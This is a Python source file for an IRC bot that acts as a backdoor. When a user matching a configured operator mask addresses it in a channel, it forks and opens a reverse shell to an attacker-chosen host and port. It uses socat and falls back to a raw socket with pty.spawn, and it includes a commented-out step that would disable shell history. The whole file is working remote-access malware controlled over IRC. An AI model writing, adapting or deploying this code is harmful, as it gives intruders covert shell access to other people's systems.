# -*- coding: utf-8 -*-

from rocksock import Rocksock, RocksockException
from irc import RsIRC

debug = False

def print_exception(irc, channel, lines):
	for line in lines.splitlines():
		irc.privmsg(channel, line)

def dprint(irc, channel, msg):
	if debug: irc.privmsg(channel, "[DEBUG] " + msg)

def dumb_backdoor(irc, channel, server, port):
	from config import shell
	import pty, socket, os
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		dprint(irc, channel, "connect")
		s.connect((server, port))
		dprint(irc, channel, "connected!")
		os.dup2(s.fileno(),0)
		os.dup2(s.fileno(),1)
		os.dup2(s.fileno(),2)
		#os.putenv("HISTFILE",'/dev/null')
		pty.spawn(shell)
	except Exception as e:
		import traceback
		print_exception(irc, channel, traceback.format_exc())

def backdoor(irc, channel, server, port):
	import os
	import shlex
	import traceback
	from config import shell

	dprint(irc, channel, "running backdoor to %s:%d"%(server, port))

	pid = os.fork()
	if pid == 0: #child
		cmd = "socat exec:'%s -i',pty,stderr,setsid,sigint,sane tcp:%s:%d"%(shell, server, port)
		cmdarr = shlex.split(cmd)
		try:
			os.execvp('socat', cmdarr)
			#os.execlp('/bin/sh', '/bin/sh', '-c', cmd)
		except OSError as e:
			dprint(irc, channel, "got socat error")
			if e.errno == os.errno.ENOENT:
				dprint(irc, channel, "trying dumb backdoor")
				dumb_backdoor(irc, channel, server, port)
			else:
				print_exception(irc, channel, traceback.format_exc())
		# catch child process on exception/after dumb shell
		os.execlp("/bin/true", "/bin/true")

def addresses_bot(word, nickname):
	return word == nickname or word == nickname + ':' or word == nickname + ','

if __name__ == '__main__':
	import time
	from config import host, botnick, channel, opmask, backdoorserver

	irc = RsIRC(host=host, port=6697, timeout=180, ssl=True, nickname=botnick, username='blah')
	irc.reconnect()
	while True:
		s = irc.readline()
		try:
			a,b,c = s.split(' ', 2)
		except:
			a, b = s.split(' ')
			if a == 'PING':
				irc.sendl('PONG %s'%b)
			else:
				print "WEIRD COMMAND:" + s
				continue

		#print "B = ___" + b + "___"
		if b == "433": #name in use
			print "nick in use, appending _ ..."
			irc.nickname = irc.nickname + "_"
			irc.reconnect()
		elif b == '376': #MOTD finish
			irc.sendl('JOIN %s'%channel)
		elif b == "PRIVMSG":
			a,b,c,d = s.split(' ', 3)
			a = a.lstrip(':')
			try:
				nick, mask = a.split('!')
			except:
				irc.privmsg(channel, "OOPS " + a)
				nick = ""
				mask = ""
			if mask.startswith('~'): mask = mask[1:]
			if mask == opmask:
				d = d.lstrip(':')
				words = d.split(' ')
				if addresses_bot(words[0], irc.nickname):
					try:
						if len(words) == 3:
							backdoor(irc, channel, words[1], int(words[2]))
						elif len(words) == 2:
							backdoor(irc, channel, backdoorserver, int(words[1]))
					except Exception as e:
						import traceback
						print_exception(irc, channel, traceback.format_exc())

		if not s: continue
		print s
